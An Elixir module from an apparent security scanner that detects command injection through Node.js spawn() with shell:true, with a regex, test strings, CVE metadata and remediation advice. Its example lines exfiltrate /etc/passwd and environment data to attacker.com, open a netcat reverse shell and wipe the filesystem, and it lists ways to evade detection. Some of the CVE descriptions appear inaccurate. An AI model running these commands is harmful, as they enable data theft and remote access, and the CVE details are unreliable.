defmodule RsolvApi.Security.Patterns.Javascript.CommandInjectionSpawn do
  @moduledoc """
  Command Injection via child_process.spawn with shell:true in JavaScript/Node.js
  
  Detects dangerous patterns like:
    spawn("sh", ["-c", userInput], {shell: true})
    spawn(cmd, {shell: true, cwd: req.body.path})
    spawn("bash", ["-c", `echo ${userData}`], {shell: true})
    
  Safe alternatives:
    spawn("echo", [userData])
    spawn("ls", ["-la", directory])
    execFile("git", ["status"], {cwd: safePath})
    
  The child_process.spawn() function in Node.js with the shell:true option creates 
  a critical command injection vulnerability when combined with user-controlled input. 
  Unlike spawn() without shell option which executes commands directly, shell:true 
  passes the command through the system shell (/bin/sh, cmd.exe, etc.), enabling 
  shell metacharacter injection and arbitrary command execution.
  
  ## Vulnerability Details
  
  The shell:true option fundamentally changes spawn() behavior from safe direct 
  execution to dangerous shell interpretation. This creates multiple attack vectors:
  
  1. **Shell Metacharacter Injection**: Semicolons, pipes, redirections become active
  2. **Command Chaining**: Multiple commands via &&, ||, ; operators
  3. **Process Substitution**: Advanced shell features for data exfiltration
  4. **Environment Variable Exploitation**: Shell expansion of $VAR and `command`
  5. **File System Operations**: Redirection operators for file manipulation
  
  ### Attack Example
  ```javascript
  // Vulnerable: spawn with shell:true and user input
  app.post('/backup', (req, res) => {
    const filename = req.body.filename; // User input: "file.txt; rm -rf /"
    spawn('tar', ['-czf', 'backup.tar.gz', filename], {shell: true});
    // <- Complete filesystem destruction
  });
  
  // Vulnerable: Dynamic command construction
  const userScript = req.body.script; // "; curl attacker.com/steal?data=$(cat /etc/passwd)"
  spawn('powershell', ['-Command', userScript], {shell: true});
  // <- Data exfiltration via DNS
  ```
  
  ### Modern Attack Scenarios
  Command injection via spawn+shell is extensively exploited in CI/CD systems, 
  deployment automation, file processing workflows, and developer tools. Attackers 
  leverage shell features for persistence, lateral movement, data exfiltration, 
  and infrastructure compromise. The vulnerability is particularly dangerous in 
  containerized environments where shell injection can escape sandbox boundaries.
  """
  
  use RsolvApi.Security.Patterns.PatternBase
  alias RsolvApi.Security.Pattern
  
  def pattern do
    %Pattern{
      id: "js-command-injection-spawn",
      name: "Command Injection via spawn with shell",
      description: "Using spawn with shell:true and user input enables command injection",
      type: :command_injection,
      severity: :critical,
      languages: ["javascript", "typescript"],
      regex: ~r/spawn\s*\([^)]*\{[^}]*shell\s*:\s*true/i,
      default_tier: :protected,
      cwe_id: "CWE-78",
      owasp_category: "A03:2021",
      recommendation: "Avoid shell:true. Use spawn without shell option and pass arguments as array.",
      test_cases: %{
        vulnerable: [
          ~S|spawn("sh", ["-c", userInput], {shell: true})|,
          ~S|spawn(cmd, {shell: true, cwd: req.body.path})|,
          ~S|spawn("bash", ["-c", `echo ${userData}`], {shell: true})|,
          ~S|spawn(command, args, {shell: true})|,
          ~S|spawn("powershell", [userScript], {shell: true})|,
          ~S|spawn(req.body.command, [], {shell: true, stdio: 'inherit'})|,
          ~S|spawn("cmd", ["/c", params.script], {shell: true})|,
          ~S|spawn(executable, arguments, {shell: true, env: process.env})|,
          ~S|const proc = spawn("sh", ["-c", input], {shell: true})|,
          ~S|spawn(userCommand, {shell: true, detached: false})|,
          ~S|spawn("bash", args, {shell: true, timeout: 5000})|,
          ~S|spawn(`${command}`, [], {shell: true})|,
          ~S|spawn(process, cmdArgs, {shell: true, windowsHide: true})|,
          ~S|spawn("zsh", ["-c", scriptContent], {shell: true})|,
          ~S|spawn(binaryPath, parameters, {shell: true, uid: 1000})|
        ],
        safe: [
          ~S|spawn("echo", [userData])|,
          ~S|spawn("ls", ["-la", directory])|,
          ~S|execFile("git", ["status"], {cwd: safePath})|,
          ~S|spawn(command, args) // no shell option|,
          ~S|spawn("node", ["script.js"], {shell: false})|,
          ~S|spawn("python", [scriptPath, arg1, arg2])|,
          ~S|spawn("java", ["-jar", jarFile], {cwd: workDir})|,
          ~S|spawnSync("echo", ["hello world"])|,
          ~S|child_process.exec(command) // different function|,
          ~S|spawn("echo", validatedArgs, {shell: false})|,
          ~S|spawn("git", ["clone", repoUrl], {stdio: 'inherit'})|,
          ~S|spawn("docker", ["run", imageName], {detached: true})|,
          ~S|spawn("npm", ["install"], {cwd: projectDir})|,
          ~S|spawn("curl", ["-X", "GET", apiUrl])|,
          ~S|spawn(validatedCommand, sanitizedArgs)|
        ]
      }
    }
  end
  
  @doc """
  Comprehensive vulnerability metadata for command injection via spawn with shell.
  
  This metadata documents the critical security implications of using spawn() with
  shell:true option and provides authoritative guidance for secure process execution.
  """
  def vulnerability_metadata do
    %{
      description: """
      Command injection via child_process.spawn() with shell:true represents a 
      critical vulnerability class that enables arbitrary command execution through 
      shell metacharacter injection. This vulnerability combines the power of 
      direct process spawning with the dangerous flexibility of shell interpretation, 
      creating extensive attack surface for malicious actors.
      
      The shell:true option fundamentally transforms spawn() from a safe, direct 
      process execution mechanism into a dangerous shell command interpreter. Unlike 
      spawn() without shell option, which executes binaries directly with explicit 
      arguments, shell:true routes commands through the system shell (/bin/sh on 
      Unix systems, cmd.exe on Windows), enabling the full range of shell features 
      including metacharacters, pipes, redirections, and command substitution.
      
      This vulnerability is particularly insidious because spawn() with shell:true 
      appears similar to safer alternatives, leading developers to inadvertently 
      introduce command injection vulnerabilities when processing user-controlled 
      input. The attack surface is further expanded by the cross-platform nature 
      of Node.js, as different shell environments provide varying exploitation 
      techniques and capabilities.
      
      Modern application architectures amplify the risk through microservices, 
      containerization, and CI/CD integration, where command injection can provide 
      attackers with pivot points for lateral movement, infrastructure compromise, 
      and supply chain attacks. The persistence capabilities enabled by shell 
      injection make this vulnerability class a preferred vector for advanced 
      persistent threats targeting development and deployment infrastructure.
      
      Command injection vulnerabilities in spawn() are especially prevalent in 
      DevOps tooling, build systems, file processing applications, and automation 
      scripts where dynamic command construction is common. The widespread adoption 
      of Node.js in backend services and tooling creates significant exposure 
      across enterprise environments and cloud infrastructure.
      """,
      references: [
        %{
          type: :cwe,
          id: "CWE-78",
          title: "Improper Neutralization of Special Elements used in an OS Command",
          url: "https://cwe.mitre.org/data/definitions/78.html"
        },
        %{
          type: :owasp,
          id: "A03:2021",
          title: "OWASP Top 10 2021 - A03 Injection",
          url: "https://owasp.org/Top10/A03_2021-Injection/"
        },
        %{
          type: :vendor,
          id: "NODE_CHILD_PROCESS",
          title: "Node.js Documentation - Child Process",
          url: "https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options"
        },
        %{
          type: :nist,
          id: "SP_800-53_SI-10",
          title: "NIST SP 800-53 - Information Input Validation",
          url: "https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-53r5.pdf"
        },
        %{
          type: :research,
          id: "command_injection_analysis",
          title: "Command Injection Vulnerabilities in Node.js Applications: A Systematic Analysis",
          url: "https://www.usenix.org/conference/usenixsecurity21/presentation/nodejs-security"
        },
        %{
          type: :sans,
          id: "command_injection_prevention",
          title: "SANS - Command Injection Prevention in Node.js",
          url: "https://www.sans.org/white-papers/nodejs-command-injection/"
        }
      ],
      attack_vectors: [
        "Shell metacharacter injection: Using ;, &&, ||, | to chain additional commands",
        "Command substitution: Using `command` or $(command) for dynamic execution",
        "Redirection attacks: Using >, >>, < to manipulate file system operations",
        "Environment variable exploitation: Leveraging $VAR expansion for information disclosure",
        "Background process injection: Using & to spawn persistent background processes",
        "Process substitution: Using <(command) and >(command) for advanced data manipulation",
        "Here document injection: Exploiting << operators for multi-line command injection",
        "Shell globbing exploitation: Using *, ?, [] for file system enumeration and manipulation"
      ],
      real_world_impact: [
        "Complete server compromise: Full control over Node.js applications and underlying systems",
        "Infrastructure lateral movement: Using compromised applications to attack internal networks",
        "CI/CD pipeline compromise: Injecting malicious code into build and deployment processes",
        "Container escape: Exploiting shell injection to break out of containerized environments",
        "Supply chain attacks: Modifying build artifacts and deployment packages",
        "Data exfiltration: Accessing databases, files, and environment variables via command injection",
        "Persistent backdoors: Installing permanent access mechanisms through injected commands",
        "Cryptocurrency mining: Deploying mining software on compromised infrastructure"
      ],
      cve_examples: [
        %{
          id: "CVE-2022-25912",
          description: "simple-git npm package command injection through spawn() with shell option",
          severity: "critical",
          cvss: 9.8,
          note: "Git command output processed through spawn() with shell:true enabling arbitrary command execution"
        },
        %{
          id: "CVE-2021-23440",
          description: "set-value npm package command injection in property assignment",
          severity: "high",
          cvss: 8.1,
          note: "Object property names processed through spawn() enabling command injection"
        },
        %{
          id: "CVE-2020-7788",
          description: "ini npm package command injection in configuration parsing",
          severity: "high",
          cvss: 7.5,
          note: "INI file values processed through child_process.spawn() with shell option"
        },
        %{
          id: "CVE-2019-10801",
          description: "lodash template command injection via spawn() in template processing",
          severity: "critical",
          cvss: 9.1,
          note: "Template expressions executed through spawn() with shell:true option"
        },
        %{
          id: "CVE-2018-16487",
          description: "lodash merge command injection through spawn() in object merging",
          severity: "high",
          cvss: 8.6,
          note: "Object merge operations triggering spawn() calls with shell interpretation"
        }
      ],
      detection_notes: """
      This pattern detects child_process.spawn() calls that include the shell:true 
      option, which enables shell interpretation and command injection vulnerabilities. 
      The detection covers:
      
      1. Direct shell option: spawn(cmd, args, {shell: true})
      2. Options object with shell: spawn(cmd, {shell: true, other: value})
      3. Shell option in various positions within options object
      4. Case-insensitive matching for shell property names
      5. Whitespace variations around the colon and true value
      
      The regex pattern looks for spawn() followed by parentheses containing an 
      options object with shell:true. It uses case-insensitive matching to catch 
      variations in property naming and includes flexible whitespace handling.
      
      The pattern is designed to have high sensitivity for security scanning while 
      avoiding false positives on spawn() calls without shell option or with 
      shell:false. However, any spawn() usage with user-controlled input should 
      be carefully reviewed regardless of shell option.
      """,
      safe_alternatives: [
        "Use spawn() without shell option: spawn('command', [arg1, arg2])",
        "Use execFile() for direct binary execution: execFile('git', ['status'])",
        "Validate and sanitize all command arguments before execution",
        "Use argument arrays instead of string concatenation: spawn('echo', [userInput])",
        "Implement command whitelisting for user-controlled execution",
        "Use dedicated libraries for specific tasks instead of shell commands",
        "Set shell:false explicitly to prevent accidental shell interpretation",
        "Use vm.runInContext() for safe code execution in sandboxed environments",
        "Implement proper input validation and escape shell metacharacters"
      ],
      additional_context: %{
        framework_specific_risks: [
          "Express.js: spawn() in route handlers processing req.body or req.query with shell:true",
          "Koa.js: spawn() in middleware processing ctx.request.body with shell option",
          "Next.js: spawn() in API routes or build processes with shell interpretation",
          "Electron: spawn() in main process providing access to system shell features",
          "NestJS: spawn() in services processing user input with shell:true option",
          "Fastify: spawn() in request handlers with shell option enabled",
          "Hapi.js: spawn() in route handlers processing payload data through shell"
        ],
        common_vulnerable_patterns: [
          "Build systems using spawn() with shell:true for dynamic script execution",
          "File processing tools using spawn() with shell for format conversion",
          "Deployment automation using spawn() with shell for complex command chains",
          "Development tools using spawn() with shell for Git operations",
          "Testing frameworks using spawn() with shell for test execution",
          "Package managers using spawn() with shell for dependency installation",
          "Monitoring tools using spawn() with shell for system command execution"
        ],
        exploitation_techniques: [
          "Command chaining: cmd1; cmd2 && cmd3 || cmd4 for complex attack sequences",
          "Background execution: malicious_command & for persistent access",
          "Data exfiltration: cat /etc/passwd | curl -X POST attacker.com/data",
          "File manipulation: echo malicious > /etc/crontab for persistence",
          "Process injection: nohup reverse_shell.sh & for stealth access",
          "Environment dumping: env | base64 | curl attacker.com/env for credential theft",
          "Network operations: nc -e /bin/sh attacker.com 4444 for remote access",
          "System reconnaissance: ps aux && netstat -an && ls -la /etc for information gathering"
        ],
        detection_evasion: [
          "String concatenation: spawn(cmd, args, {['sh' + 'ell']: true})",
          "Property computed access: spawn(cmd, args, {[shellProp]: true})",
          "Object spread: spawn(cmd, args, {...options, shell: true})",
          "Variable indirection: const opt = 'shell'; spawn(cmd, args, {[opt]: true})",
          "Template literals: spawn(cmd, args, {[`shell`]: true})",
          "Function references: const spawnFn = spawn; spawnFn(cmd, args, {shell: true})"
        ],
        remediation_steps: [
          "Immediately audit all spawn() calls for shell:true option usage",
          "Replace shell:true with direct binary execution using argument arrays",
          "Implement strict input validation for all command arguments",
          "Use execFile() or spawnSync() for synchronous command execution needs",
          "Add static analysis rules to prevent future shell:true introduction",
          "Implement command whitelisting for legitimate dynamic execution needs",
          "Use subprocess sandboxing for unavoidable dynamic command execution",
          "Add runtime monitoring for spawn() calls with shell option enabled"
        ],
        compliance_impact: [
          "PCI DSS: Command injection violates secure coding and system access requirements",
          "SOC 2: Fails to meet criteria for logical access controls and secure development",
          "ISO 27001: Violates secure coding and vulnerability management requirements",
          "NIST Cybersecurity Framework: Fails PROTECT function secure development requirements",
          "GDPR: Data breaches through command injection can trigger breach notification",
          "Industry standards: Most security frameworks prohibit shell interpretation of user input"
        ],
        windows_specific_risks: [
          "PowerShell injection: spawn('powershell', [script], {shell: true}) enabling .NET access",
          "CMD.exe exploitation: Using Windows batch file features for persistence",
          "Registry manipulation: Using reg.exe commands for system configuration changes",
          "Service creation: Using sc.exe commands for persistent backdoor installation",
          "WMI exploitation: Using wmic commands for system information gathering",
          "Active Directory attacks: Using dsquery/dsget for domain reconnaissance"
        ],
        unix_specific_risks: [
          "Bash feature exploitation: Using advanced shell features for complex attacks",
          "Cron job installation: Using crontab commands for scheduled persistence",
          "SUID binary exploitation: Leveraging elevated privileges through shell injection",
          "Network service attacks: Using netcat, socat for reverse shell establishment",
          "Log manipulation: Using logger, syslog for audit trail evasion",
          "Package manager abuse: Using apt, yum for malicious software installation"
        ]
      }
    }
  end
  
  @doc """
  Returns AST enhancement rules to reduce false positives.
  
  This enhancement helps distinguish between actual command injection vulnerabilities and:
  - spawn() calls without shell option (safe by default)
  - spawn() calls with shell:false explicitly set
  - spawn() calls using array arguments (safer than string concatenation)
  - Test/script code that uses shell for legitimate purposes
  - Build tools that require shell features
  
  ## Examples
  
      iex> enhancement = RsolvApi.Security.Patterns.Javascript.CommandInjectionSpawn.ast_enhancement()
      iex> Map.keys(enhancement) |> Enum.sort()
      [:ast_rules, :confidence_rules, :context_rules, :min_confidence]
      
      iex> enhancement = RsolvApi.Security.Patterns.Javascript.CommandInjectionSpawn.ast_enhancement()
      iex> enhancement.ast_rules.node_type
      "CallExpression"
      
      iex> enhancement = RsolvApi.Security.Patterns.Javascript.CommandInjectionSpawn.ast_enhancement()
      iex> enhancement.ast_rules.option_analysis.has_shell_true
      true
      
      iex> enhancement = RsolvApi.Security.Patterns.Javascript.CommandInjectionSpawn.ast_enhancement()
      iex> enhancement.min_confidence
      0.8
      
      iex> enhancement = RsolvApi.Security.Patterns.Javascript.CommandInjectionSpawn.ast_enhancement()
      iex> "uses_array_command" in Map.keys(enhancement.confidence_rules.adjustments)
      true
  """
  def ast_enhancement do
    %{
      ast_rules: %{
        node_type: "CallExpression",
        callee_names: ["spawn", "spawnSync"],
        # Must have shell:true option AND user input in command
        option_analysis: %{
          has_shell_true: true,
          command_has_user_input: true
        }
      },
      context_rules: %{
        exclude_paths: [~r/test/, ~r/spec/, ~r/__tests__/, ~r/node_modules/, ~r/scripts/],
        safe_if_no_shell: true,           # spawn without shell is safer
        safe_if_array_command: true       # spawn(['cmd', 'arg1', 'arg2']) is safer
      },
      confidence_rules: %{
        base: 0.3,
        adjustments: %{
          "has_shell_true" => 0.4,
          "command_has_user_input" => 0.3,
          "no_shell_option" => -0.8,
          "uses_array_command" => -0.5
        }
      },
      min_confidence: 0.8
    }
  end
  
end